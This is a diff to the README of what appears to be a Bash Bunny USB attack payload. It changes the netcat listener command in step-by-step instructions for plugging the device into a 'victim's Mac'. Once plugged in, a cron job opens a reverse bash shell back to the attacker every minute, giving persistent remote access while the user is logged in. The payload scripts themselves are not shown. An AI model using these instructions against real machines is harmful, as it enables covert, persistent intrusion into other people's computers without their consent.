@@ -34,7 +34,7 @@ Have a working Bash Bunny :)
 6. Plug the Bash Bunny into your victim's Mac and wait until the final light turns green (about 30 sec)
 7. Unplug the Bash Bunny and go to attacker's machine
 8. Listen on the port you chose in the payload.txt file on whichever program you'd like (I use NetCat)
-	* If using NetCat, run the command `nc -nlvp 1337` (replace the port with the port in connect.sh)
+	* If using NetCat, run the command `nc -lnv 1337` (replace the port with the port in connect.sh)
 		* If using Windows as the attacker machine, you must install Ncat from: http://nmap.org/dist/ncat-portable-5.59BETA1.zip and use the command `ncat` instead of `nc` from the directory that you installed ncat.exe.
 9. Wait for connection (Should take no longer than 1 minute as the cron job runs every minute)
 10. Once a bash shell prompt appears...YOU'RE DONE!! :smiley: and you can disconnect and reconnect to the victim at any time as long as the user is logged in
